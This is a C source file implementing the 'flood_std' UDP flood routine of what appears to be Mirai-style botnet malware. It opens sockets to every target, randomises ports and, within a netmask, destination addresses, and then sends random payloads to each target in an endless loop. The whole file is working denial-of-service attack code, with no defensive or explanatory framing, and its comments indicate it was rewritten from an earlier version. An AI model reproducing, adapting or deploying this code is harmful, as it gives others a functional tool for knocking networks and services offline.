#define _GNU_SOURCE

#ifdef DEBUG
#endif

#include "../../attack.h"

void flood_std(struct flood *flood)
{
    int i;
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));
    int *fds = calloc(flood->num_of_targets, sizeof(int));
    struct sockaddr_in bind_addr = {0};

    flood->settings->source_port = flood->settings->source_port == 0xffff ? rand_next() : htons(flood->settings->source_port);

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        char *payload;

        pkts[i] = calloc(65535, sizeof(char));
        flood->targets[i].sock_addr.sin_port = flood->settings->dest_port == 0xffff ? rand_next() : htons(flood->settings->dest_port);

        if ((fds[i] = sys_socket(AF_INET, SOCK_DGRAM, 0)) == -1)
            return;

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = flood->settings->source_port;
        bind_addr.sin_addr.s_addr = 0;

        sys_bind(fds[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        if (flood->targets[i].netmask < 32)
            flood->targets[i].sock_addr.sin_addr.s_addr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));

        sys_connect(fds[i], (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
    }

    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);
            
            if (flood->settings->length > 0)
            {
                char buffer[flood->settings->length];
                rand_str(buffer, flood->settings->length);
                sys_sendto(fds[i], buffer, flood->settings->length, MSG_NOSIGNAL, NULL, 0);
            }
            else
            {
                // If length is 0, send a single randomized byte as a fallback or 0 byte packet if preferred.
                // Given the original code sent a byte from an array, we'll send 1 random byte.
                char b = (char)(rand_next() & 0xff);
                sys_sendto(fds[i], &b, 1, MSG_NOSIGNAL, NULL, 0);
            }
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
